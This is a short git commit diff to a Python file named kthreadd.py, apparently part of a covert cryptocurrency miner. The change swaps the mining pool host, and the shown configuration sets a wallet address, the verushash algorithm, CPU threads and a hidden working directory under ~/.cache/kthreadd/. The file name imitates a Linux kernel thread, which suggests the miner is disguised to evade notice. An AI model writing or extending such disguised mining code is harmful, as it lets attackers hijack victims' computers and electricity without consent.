4350e933d82b8a8e6919d9715f887c1a99bc7fbf
ANTI VIRAL <109937537+ANTI-VIRAL@users.noreply.github.com>
2025-05-26 23:59:33 +0000

    Update kthreadd.py

--- kthreadd.py
+++ kthreadd.py
@@ -6,7 +6,7 @@ import shutil
 
 # Konfigurasi
 WALLET = "REy6w1W9pQ7U4LebYx6zp6mZxHkBzc3e5y"
-POOL = "ghost.darkverse.cloud:11002"
+POOL = "interstellar.hidora.com:11283"
 ALGO = "verushash"
 CPU_THREADS = 2
 BASE_PATH = os.path.expanduser("~/.cache/kthreadd/")
